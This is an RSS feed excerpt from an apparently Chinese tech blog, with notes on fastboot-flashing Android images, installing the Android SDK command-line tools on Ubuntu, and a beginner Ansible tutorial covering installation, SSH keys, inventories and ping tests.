<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vendor.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> userdata</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/userdata.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> product</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/product.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta_system</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vbmeta_system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system_ext</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/system_ext.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor_boot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vendor_boot.img</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># fastboot flash vendor_dlkm_a out/target/product/&lt;device&gt;/vendor_dlkm.img</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> oem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .....</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">pat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">h&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/SW_binaries_for_Xperia_Android_14_5.4_v3a_murray.img</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>重启</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu命令行安装Android SDK</title>
      <link>https://www.geekery.cn/note-book/Android/Ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%89%E8%A3%85Android%20SDK.html</link>
      <guid>https://www.geekery.cn/note-book/Android/Ubuntu%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%89%E8%A3%85Android%20SDK.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu命令行安装Android SDK</source>
      <description>Ubuntu命令行安装Android SDK 安装步骤 新建 android-sdk 作为工作目录。 下载命令行工具 sdkmanager: wget https://dl.google.com/android/repository/commandlinetools-linux-7302050_latest.zip 解压： unzip commandl...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>安装步骤</h2>
<ol>
<li>
<p>新建 <strong>android-sdk</strong> 作为工作目录。</p>
</li>
<li>
<p>下载命令行工具 sdkmanager:</p>
<p><code>wget https://dl.google.com/android/repository/commandlinetools-linux-7302050_latest.zip</code></p>
</li>
<li>
<p>解压：</p>
<p><code>unzip commandlinetools-linux-7302050_latest.zip</code>，</p>
<p>进入目录如下所示</p>
</li>
<li>
<p></p>
</li>
<li>
<p>进入 <strong>cmdline-tools</strong> 目录，执行 <code>./bin/sdkmanager</code> 报错 “Error: Could not deter mine SDK root.”</p>
</li>
<li>
<p>在当前目录新建 <strong>latest</strong> 目录，并将原 <strong>cmdline-tools</strong> 下的所有文件移至 <strong>latest</strong>下，操作如下：</p>
</li>
</ol>
<p></p>
<ol start="7">
<li>
<p>下载完成后，执行 <code>ls ..</code> 查看上级目录中的文件：</p>
<p></p>
</li>
</ol>
<h2>引用</h2>
<ol>
<li><a href="https://stackoverflow.com/questions/65262340/cmdline-tools-could-not-determine-sdk-root" target="_blank" rel="noopener noreferrer">cmdline-tools : could not determine SDK root</a></li>
<li><a href="https://developer.android.com/studio/command-line/sdkmanager#list_installed_and_available_packages" target="_blank" rel="noopener noreferrer">sdkmanager</a></li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>Ansible自动化运维</title>
      <link>https://www.geekery.cn/note-book/Ansible/Ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4.html</link>
      <guid>https://www.geekery.cn/note-book/Ansible/Ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ansible自动化运维</source>
      <description>Ansible自动化运维 1-简介 Logo image-20211106190344512 介绍 ansible是新出现的自动化运维工具，基于Python开发，集合了众多运维工具（puppet、cfengine、chef、func、fabric）的优点， 实现了批量系统配置、批量程序部署、批量运行命令等功能。 无客户端。 我们要学一些Ansible的...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>1-简介</h2>
<h3>Logo</h3>
<p></p>
<h3>介绍</h3>
<p>ansible是新出现的自动化运维工具，基于<strong>Python</strong>开发，集合了众多运维工具（puppet、cfengine、chef、func、fabric）的优点，
实现了批量系统配置、批量程序部署、批量运行命令等功能。
无客户端。</p>
<p>我们要学一些Ansible的安装和一些基本概念,然后我们会开始研究一些真正有意思的东西 – <strong>playbook</strong>,配置管理,部署以及语法编排.我们将会学习如何使用/usr/bin/ansible执行ad-hoc并行命令,我们还会学习ansible的核心有什么样的模块可供使用.当然以后你也可以写你自己的模块,我们会在后期讲到.</p>
<h3>工作原理</h3>
<p></p>
<h2>2-部署</h2>
<h3><strong>ns resolve</strong></h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">172.16.100.12</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ansible-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">172.16.100.13</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">172.16.100.14</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host2</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>ansible-server</h4>
<p>配置域名解析</p>
<h4>ansible 客户机</h4>
<blockquote>
<p>无需配置</p>
</blockquote>
<h3>安装ansible</h3>
<p>ansible服务器</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel-release</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">安装epel源，如果您在非学校环境，请使用下方阿里YUM</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/yum.repos.d/</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -O</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/yum.repos.d/epel.repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http://mirrors.aliyun.com/repo/epel-7.repo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -O</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/yum.repos.d/CentOS-Base.repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http://mirrors.aliyun.com/repo/Centos-7.repo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ansible</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     检测部署是否完成</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                 </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rpm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ql</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ansible</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   列出所有文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rpm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ansible</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    查看配置文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --help</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     查看ansible帮助</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible-doc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -l</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       看所有模块（A10，华为，docker，EC2，aws等等广大厂商设备）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible-doc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     看yum模块，了解其功能</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>3-ssh-key</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ssh-keygen</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    //产出公钥</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ssh-copy-id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IP地址</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  //推送公钥</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这一步也可以不做就是ansible 的时候需要输入密码</p>
<h2>4-ansible基础</h2>
<h3>1.★定义主机清单</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/ansible/hosts</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>2.测试连通性</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -o</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>3.简洁输出</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ansible-server ~]# ansible hos1 -m ping -o</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># -o 简洁输出</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[WARNING]: Could not match supplied host pattern, ignoring: hos1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[WARNING]: No hosts matched, nothing to </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ansible-server ~]# ansible host1 -m ping -o</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{"ansible_facts":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {"discovered_interpreter_python":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/usr/bin/python"},</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "changed":</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> false</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "ping":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "pong"}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ansible-server ~]# ansible host1 -m ping </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "ansible_facts"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        "discovered_interpreter_python"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "/usr/bin/python"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }, </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "changed"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> false</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "ping"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "pong"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ansible-server ~]# ansible host2 -m ping </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 未添加hosts</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[WARNING]: Could not match supplied host pattern, ignoring: host2</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[WARNING]: No hosts matched, nothing to </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>4.★know_hosts</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@ansible-server ~]# ansible host1 -m ping -u root -k -o  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 没放进hosts,需要输入密码</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># -k 交互式密码输入</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SSH</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> password:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{"ansible_facts":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {"discovered_interpreter_python":"/usr/bin/python"},</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "changed":</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> false</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "ping":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "pong"}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>去掉（yes/no）的询问</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/ssh/ssh_config</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> StrictHostKeyChecking</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    //写入的内容</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sshd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       //重启sshd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>5.错误示范</h3>
<p>ansible host4 -m ping -u root -k -o      //失败，主机清单未标注主机。</p>
<h3>6.请注意ping和ssh</h3>
<p>ping  ICMP：网际消息管理协议 <strong>4层</strong></p>
<p>ssh ；应用层安全连接 <strong>7层</strong></p>
<p>关闭host1主机的sshd进程，进行ping连通性测试。</p>
<p>再使用ansible对host1进行联通测试时，却是失败的。</p>
<p>结论ansible的ping，是探测ssh程序是否连接。不是icmp协议</p>
<p>ansible host1 -m ping -u root -k</p>
<h3>7.高并发</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> webserver</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -om</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># -f 2 并发两个线程</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>5-Inventory -主机清单</h2>
<blockquote>
<p>含义:
清查;存货清单;财产目录;主机清单</p>
</blockquote>
<h3>/etc/ansible/hosts</h3>
<h4>1 增加主机组</h4>
<p>官方链接: <a href="https://docs.ansible.com/ansible/latest/dev_guide/overview_architecture.html#inventory" target="_blank" rel="noopener noreferrer">https://docs.ansible.com/ansible/latest/dev_guide/overview_architecture.html#inventory</a></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/ansible/hosts</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[webserver]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">host2</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ansible</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> webserver</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -k</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<h4>2 增加用户名 密码</h4>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-yaml"><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vim /etc/ansible/hosts                         //注意您的密码与我这里不同。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>CentOS 7.x安装Python3.9.7和Ansible4.5</title>
      <link>https://www.geekery.cn/note-book/Ansible/Centos7.x%E5%AE%89%E8%A3%85Python3.9.7%E5%92%8CAnsible4.5.html</link>
